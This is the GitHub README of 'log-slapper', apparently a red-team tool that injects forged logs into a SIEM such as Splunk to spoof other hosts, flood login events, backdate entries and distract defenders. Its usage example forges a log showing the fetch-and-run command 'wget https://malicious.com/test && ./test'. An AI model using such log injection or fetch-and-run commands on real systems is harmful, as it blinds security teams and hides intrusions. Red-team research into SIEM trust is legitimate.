# log-slapper 👹
<p align="center">
<img width="600" align="center" alt="image"  src="https://github.com/oz9un/log-slapper/assets/57866851/fd320c4b-5c90-45d3-a477-2fc44e1cf66d">
</p>

<br>

**Every company undoubtedly trusts its SIEM, right? Think twice, we can inject fake logs, distract BT's and hide our attacks.**


## description
log-slapper is the offensive security tool for red-teamers and specifically designed for post-exploit part of the campaign.
<br>


log-slapper can:
- mimic attacks on behalf of any other computer on the network
- run in interactive mode: Target Shell Playzone
- send logs from future and past: HEC based Time Traveller's attack 
- perform built-in attacks like login success/fail spam, new process creations

## usage
<img width="500" alt="image" src="https://github.com/oz9un/log-slapper/assets/57866851/a564c9c5-9bcf-4ff8-b4ee-941c359e45bd">
<br>
<br>

go into interactive mode:
```
./log-slapper interactive
```
send log as "payment-server-01" got hacked and malicious code is running:

```
./log-slapper nix_command --hostname "payment-server-01" --ip "23.32.45.123" -t "e270e632-861f-45cc-8f00-f91eb895f5e6" --exectime "10/10/2021 08:45" --command "wget https://malicious.com/test && ./test"
```

Now check your Splunk 🙂

## video

for more details on research, usage of log-slapper and more:<br>
[![SIEM SLAM](https://img.youtube.com/vi/m3sLC2WQ1ug/0.jpg)](https://www.youtube.com/watch?v=m3sLC2WQ1ug)
